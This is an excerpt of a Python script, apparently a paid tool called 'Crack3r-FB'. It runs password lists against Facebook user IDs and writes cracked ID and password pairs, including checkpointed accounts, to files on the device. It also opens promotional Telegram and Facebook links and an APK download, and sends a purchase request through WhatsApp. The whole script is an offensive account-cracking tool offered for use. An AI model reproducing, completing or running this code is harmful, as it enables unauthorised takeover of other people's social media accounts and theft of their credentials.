...
os.system('xdg-open https://t.me/technofardin')
...
try:
        ...
        os.system('python crack3rmrx.py')
except:pass
...
logo=("""\033[1;37m
  ...
  / ___|_ __ __ _  ___| | _|___ / _ __     |  ___| __ ) 
 | |   | '__/ _` |/ __| |/ / |_ \| '__|____| |_  |  _ \ 
 | |___| | | (_| | (__|   < ___) | | |_____|  _| | |_) |
  \____|_|  \__,_|\___|_|\_\____/|_|       |_|   |____/ 
                                                        
----------------------------------------------
 Author    : Fardin Ahmed 
 Github    : mrxfardin 
 Facebook  : Fardin Ahmed (Finn)
 Tool Name : Crack3r-FB 
 Type type : PAID
 Version   : 2.0
----------------------------------------------
 CRACK3R-FB PRO VERSION 2.0
 FEEL THE POWER OF CRACK3R-FB (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://t.me/technofardin{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/ahfardin01');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801754169166&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Fardin Sir, I Need To Buy Your Paid CRACK3R-FB PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python crack3rmrx.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Fardin-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [FARDIN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/FARDIN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [FARDIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FARDIN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [FARDIN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FARDIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/FARDIN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [FARDIN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/FARDIN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [FARDIN-OK] '+uid+' | '+pas+'\033[1;97m')
